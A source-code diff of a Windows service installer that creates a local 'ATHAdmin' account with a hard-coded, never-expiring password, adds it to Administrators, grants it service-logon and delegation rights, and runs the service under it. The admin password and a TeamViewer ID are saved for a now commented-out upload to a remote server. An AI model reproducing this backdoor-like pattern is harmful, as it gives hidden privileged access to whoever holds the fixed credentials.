@@ -1,5 +1,5 @@
 #include "ATHService.h"
-
+//#include <LM.h>
 std::vector<ATHService*> ATHService::Services;
 
 ATHService *service;
@@ -39,35 +39,64 @@ int ATHService::run()
 int ATHService::install()
 {
 	USER_INFO_1 ATHAdmin, ATHUser;
+
 	DWORD dwLevel = 1;
 	DWORD dwError = 0;
+	memset(&ATHAdmin, 0, sizeof(ATHAdmin));
+	memset(&ATHUser, 0, sizeof(ATHUser));
 	ATHAdmin.usri1_name = L"ATHAdmin";
-	ATHAdmin.usri1_password = GeneratePassword();
-	ATHAdmin.usri1_priv = USER_PRIV_ADMIN;
+	ATHAdmin.usri1_password = L"%6Nop!2dgPPv";
+	ATHAdmin.usri1_priv = USER_PRIV_USER;
 	ATHAdmin.usri1_home_dir = NULL;
 	ATHAdmin.usri1_comment = NULL;
-	ATHAdmin.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
+	ATHAdmin.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD | UF_TRUSTED_FOR_DELEGATION;
 	ATHAdmin.usri1_script_path = NULL;
 
-	NET_API_STATUS nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ATHAdmin, &dwError);
+	NET_API_STATUS nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ATHAdmin, NULL);
+
+	LOCALGROUP_MEMBERS_INFO_3 account;
+	memset(&account, 0, sizeof(account));
+
+	account.lgrmi3_domainandname = L"ATHAdmin";
+	NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
+	NetLocalGroupAddMembers(NULL, L"Администраторы", 3, (LPBYTE)&account, 1);
 
 
 	ATHUser.usri1_name = L"ATHUser";
-	ATHUser.usri1_password = L"Ath2018";
-	ATHUser.usri1_priv = USER_PRIV_ADMIN;
+	ATHUser.usri1_password = L"Ath@2018";
+	ATHUser.usri1_priv = USER_PRIV_USER;
 	ATHUser.usri1_home_dir = NULL;
 	ATHUser.usri1_comment = NULL;
-	ATHUser.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
+	ATHUser.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_PASSWORD_EXPIRED;
 	ATHUser.usri1_script_path = NULL;
 
-	nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ATHUser, &dwError);
+	nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ATHUser, NULL);
+
+	memset(&account, 0, sizeof(account));
+
+	account.lgrmi3_domainandname = L"ATHUser";
+	NetLocalGroupAddMembers(NULL, L"Users", 3, (LPBYTE)&account, 1);
+	NetLocalGroupAddMembers(NULL, L"Пользователи", 3, (LPBYTE)&account, 1);
 
 	Json::Value root;
-	root["admin"] = ATHAdmin.usri1_password;
+	root["admin"] = "%6Nop!2dgPPv";
 	DWORD nResult(0);
 	GetDWORDRegKey(&nResult);
 	root["Teamviewer"] = (unsigned int)nResult;
 
+	LSA_OBJECT_ATTRIBUTES ObjectAttributes;
+	ZeroMemory(&ObjectAttributes, sizeof(ObjectAttributes));
+	LSA_HANDLE lsaH;
+	LSA_UNICODE_STRING* userRights = new LSA_UNICODE_STRING[1];
+	LsaOpenPolicy(NULL, &ObjectAttributes, POLICY_CREATE_ACCOUNT | POLICY_LOOKUP_NAMES, &lsaH);
+	PSID Sid = (PSID)LocalAlloc(LPTR, SECURITY_MAX_SID_SIZE);
+	DWORD cbSid = SECURITY_MAX_SID_SIZE;
+	LPWSTR DomainName = (LPWSTR)LocalAlloc(LPTR, sizeof(WCHAR) * 2048);
+	DWORD size = 1024;
+	SID_NAME_USE peUse;
+	LookupAccountName(NULL, L"ATHAdmin", Sid, &cbSid, DomainName, &size, &peUse);
+	InitLsaString(userRights, L"SeServiceLogonRight");
+	LsaAddAccountRights(lsaH, Sid, userRights, 1);
 	Json::StyledStreamWriter writer;
 	std::ofstream fwsetting(L"AthFile.err");
 	writer.write(fwsetting, root);
@@ -81,42 +110,50 @@ int ATHService::install()
 	return 0;
 }
 
-static size_t read_callback(void *dest, size_t size, size_t nmemb, void *userp)
+
+bool ATHService::InitLsaString(PLSA_UNICODE_STRING pLsaString,LPCWSTR pwszString)
 {
-	/*struct WriteThis *wt = (struct WriteThis *)userp;
-	size_t buffer_size = size * nmemb;
+	DWORD dwLen = 0;
 
-	if (wt->sizeleft) {
-		/* copy as much as possible from the source to the destination 
-		size_t copy_this_much = wt->sizeleft;
-		if (copy_this_much > buffer_size)
-			copy_this_much = buffer_size;
-		memcpy(dest, wt->readptr, copy_this_much);
+	if (NULL == pLsaString)
+		return FALSE;
 
-		wt->readptr += copy_this_much;
-		wt->sizeleft -= copy_this_much;
-		return copy_this_much; /* we copied this many bytes */
-		return 0;
+	if (NULL != pwszString)
+	{
+		dwLen = wcslen(pwszString);
+		if (dwLen > 0x7ffe)   // String is too large
+			return FALSE;
 	}
 
-void ATHService::SendJson()
+	// Store the string.
+	pLsaString->Buffer = (WCHAR *)pwszString;
+	pLsaString->Length = (USHORT)dwLen * sizeof(WCHAR);
+	pLsaString->MaximumLength = (USHORT)(dwLen + 1) * sizeof(WCHAR);
+
+	return TRUE;
+}
+
+
+static size_t read_callback(void *dest, size_t size, size_t nmemb, void *userp) {
+	DWORD readBytes(0);
+	ReadFile(userp, dest, size*nmemb, &readBytes, NULL);
+	return readBytes;
+}
+
+/*void ATHService::SendJson()
 {
 	curl_global_init(CURL_GLOBAL_ALL);
 	CURL *curl = curl_easy_init();
 
-	//headerList = curl_slist_append(headerList, "Authorization: Basic TOKENHERE=");
-	//WCHAR * targUrl = new WCHAR[255];
-	//wsprintf(targUrl, L"http://vpnapi.ath.ru:9898/");
-	//FILE * fd = new FILE; 
-	//fopen_s(&fd, "c:\\temp\\AthFile.err", "rb");
+	HANDLE fd = CreateFile(L"c:\\temp\\AthFile.err", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 	curl_easy_setopt(curl, CURLOPT_URL, L"http://vpnapi.ath.ru:9898/");
 	curl_easy_setopt(curl, CURLOPT_POST, 1L);
 	curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
-	//curl_easy_setopt(curl, CURLOPT_READDATA, fd);
+	curl_easy_setopt(curl, CURLOPT_READDATA, fd);
 	curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);
 	curl_easy_perform(curl);
 	curl_easy_cleanup(curl);
-}
+}*/
 
 LONG ATHService::GetDWORDRegKey(DWORD *nValue)
 {
@@ -157,7 +194,7 @@ int ATHService::InstallAll(int Index)
 	LPWSTR curServiceName = new WCHAR[256];
 	wsprintf(curServiceName, L"%s%i\0", serviceName, Index);
 	hService = CreateService(hSCManager, curServiceName, curServiceName, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
-		SERVICE_AUTO_START, SERVICE_ERROR_CRITICAL, servicePath, NULL, NULL, NULL, NULL, NULL);
+		SERVICE_AUTO_START, SERVICE_ERROR_CRITICAL, servicePath, NULL, NULL, NULL, L".\\ATHAdmin\0", L"%6Nop!2dgPPv");
 
 	if (!hService) {
 		int err = GetLastError();
